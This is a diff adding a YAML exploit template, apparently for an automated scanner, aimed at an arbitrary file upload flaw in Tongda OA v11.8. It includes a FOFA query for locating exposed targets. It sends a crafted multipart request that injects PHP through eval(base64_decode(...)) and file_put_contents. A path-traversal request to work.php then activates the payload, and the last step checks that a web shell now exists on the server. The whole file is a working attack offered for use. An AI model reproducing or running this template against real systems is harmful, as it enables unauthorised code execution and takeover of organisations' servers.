@@ -1,0 +1,57 @@
+info:
+  vulId: tongda_fileupload_api_ali
+  detail: "通达OA v11.8 api.ali.php 任意文件上传漏洞，shell地址为{{rootUrl}}/{{random(6)}}.php"
+  fofaQuery: app="TDXK-通达OA"
+  expType: upload
+variable:
+  - ""
+rules:
+  - request:
+      path: "{{rootUrl}}/mobile/api/api.ali.php"
+      method: POST
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+        Content-type: multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae
+      redirect: false
+      dataType: text
+      data: "--502f67681799b07e4de6b503655f5cae\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{random(6)}}.json\"\r\nContent-Type: application/octet-stream\r\n\r\n{\"modular\":\"AllVariable\",\"a\":\"{{base64(file_put_contents('../../{{random(6)}}.php','{{fileContent}}');)}}\",\"dataAnalysis\":\"{\\\"a\\\":\\\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\\\"}\"}\r\n--502f67681799b07e4de6b503655f5cae--"
+    checksCondition: and
+    checks:
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
+
+  - request:
+      path: "{{rootUrl}}/inc/package/work.php?id=../../../../../myoa/attach/approve_center/{{year}}{{month}}/%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E%3E.{{random(6)}}"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+      redirect: false
+      dataType: text
+    checksCondition: and
+    checks:
+      - checkType: string
+        desireds:
+          - OK
+        place: body
+        condition: and
+
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
+
+  - request:
+      path: "{{rootUrl}}/{{random(6)}}.php"
+      method: GET
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36
+      redirect: false
+      dataType: text
+    checksCondition: and
+    checks:
+      - checkType: status
+        desireds:
+          - 200
+        condition: and
